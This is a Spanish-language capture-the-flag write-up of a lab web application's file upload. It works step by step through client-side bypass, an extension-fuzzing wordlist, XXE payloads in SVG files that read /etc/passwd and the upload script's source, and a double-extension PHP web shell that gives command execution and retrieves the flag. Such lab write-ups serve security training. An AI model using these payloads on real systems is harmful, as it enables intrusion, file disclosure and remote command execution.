# Writeup Skill Assessment

## SCOPE

- [144.126.232.205:32124](144.126.232.205:32124)

## writeup

La pagina tiene una carga de archivos y previsualizacion en la parte de contactos:

- [http://144.126.232.205:32124/contact/](http://144.126.232.205:32124/contact/)
![[Pasted image 20230107205857.png]]

primero vamos a cargar una imagen para ver que formatos admite:

![[Pasted image 20230107205940.png]]

cargamos una imagen jpeg:

![[Pasted image 20230107212043.png]]

si interceptamos la carga del archivo vemos una foto en `JPEG` firma que indica que es `JPEG:

![[Pasted image 20230107212144.png]]

este es el **MIME Type** que usaremos mas adelante

>[!note]
>A la hora de intentar vulnerar una carga de archivos, primero cargar un archivo correctamente y capturar con Burpsuite para ver como lo manda, despues adaptamos nuestro ataque sobre ese request valido.



vamos a evadir la proteccion del lado del cliente eliminando ciertas partes del codigo HTML:

antes

![[Pasted image 20230107210326.png]]

despues

![[Pasted image 20230107210431.png]]

ahora vamos a cargar un simple archivo PHP y capturamos con burpsuite:

```php
<?php
   system($_GET['cmd']);
?>
```

![[Pasted image 20230107210525.png]]

nos indica que no es una extension valida. Primero vamos a cambiar el header `Content-Type` para `PNG`:

```bash
image/jpeg
```

despues vamos a fuzzear extensiones validas, usare este diccionario para el intruder:

```bash
jpeg.php
jpg.php
png.php
php
php3
php4
php5
php7
php8
pht
png
jpg
jpeg
svg
phar
phpt
pgif
phtml
phtm
php%00.gif
php\x00.gif
php%00.png
php\x00.png
php%00.jpg
php\x00.jpg
phtml
php
php3
php4
php5
inc  
pHtml
pHp
pHp3
pHp4
pHp5
iNc
iNc%00
iNc%20%20%20
iNc%20%20%20...%20.%20..
iNc......
inc%00
inc%20%20%20
inc%20%20%20...%20.%20..
inc......
pHp%00
pHp%20%20%20
pHp%20%20%20...%20.%20..
pHp......
pHp3%00
pHp3%20%20%20
pHp3%20%20%20...%20.%20..
pHp3......
pHp4%00
pHp4%20%20%20
pHp4%20%20%20...%20.%20..
pHp4......
pHp5%00
pHp5%20%20%20
pHp5%20%20%20...%20.%20..
pHp5......
pHtml%00
pHtml%20%20%20
pHtml%20%20%20...%20.%20..
pHtml......
php%00
php%20%20%20
php%20%20%20...%20.%20..
php......
php3%00
php3%20%20%20
php3%20%20%20...%20.%20..
php3......
php4%00
php4%20%20%20
php4%20%20%20...%20.%20..
php4......
php5%00
php5%20%20%20
php5%20%20%20...%20.%20..
php5......
phtml%00
phtml%20%20%20
phtml%20%20%20...%20.%20..
phtml......
asp
aspx
bat
c
cfm
cgi
css
com
dll
exe
htm
html
inc
jhtml
js
jsa
jsp
log
mdb
nsf
pcap
php
php2
php3
php4
php5
php6
php7
phps
pht
phtml
pl
reg
sh
shtml
sql
swf
txt
xml
```

en el intruder quitamos el URL encoded de caracteres especiales para evitar problemas:

![[Pasted image 20230107210911.png]]

vemos que svg y phar son validos:

![[Pasted image 20230107211206.png]]

- con **svg** podemos intentar una lectura de archivos a traves de XXE
- con **phar** podemos realizar la carga de la web shell, pero primero debemos ver que extensiones estan validas.

### XXE CON SVG

- Colocamos la extension a al archivo con **.svg**
- Quitamos la firma del MIME Type de jpeg
- colocamos el siguiente contenido XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

![[Pasted image 20230107212809.png]]

como podemos leer archivos, vamos a leer el archivo de carga **upload.php**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```

![[Pasted image 20230107213102.png]]

```bash
echo "OUTPUT" | base64 -d > upload.php
```

![[Pasted image 20230107213238.png]]

podemos ver 2 cosas importantes:

- la ruta de la carga de archivos es **/user_feedback_submissions/**
- Esta renombrando el archivo a:

```php
date('ymd')_NOMBREARCHIVO
```

la funcion de PHP `date('ymd')` devuelve el siguiente resultado:

![[Pasted image 20230107213550.png]]

>[!note]
>Devuelve la fecha actual por lo que no debe copiar ese valor sino ver la echa actual que tiene.

### RCE CON PHAR Y JPEG

la extension `phar` es valida pero no es una imagen valida, sabemos que el sistema admite `jpg, jpeg y png`, vamos a usar `jpeg` con si firma de **MIME Type** y la tecnia de **Bypass Whitelist** usando doble extension, en este caso `.phar.jpeg`:

![[Pasted image 20230107213953.png]]

Recordemos que la firma lo obtuvimos enviando una imagen valida `jpeg` y capturandolo con burpsuite.

Nuestro archivo tendra este nombre:

```bash
/user_feedback_submissions/230108_shell.phar.jpeg
```

vamos a buscarlo:

![[Pasted image 20230107214152.png]]

ahora ejecutemos un comando:

![[Pasted image 20230107214214.png]]

ahora obtengamos la bandera:

![[Pasted image 20230107214247.png]]

**cat /flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt**

![[Pasted image 20230107214431.png]]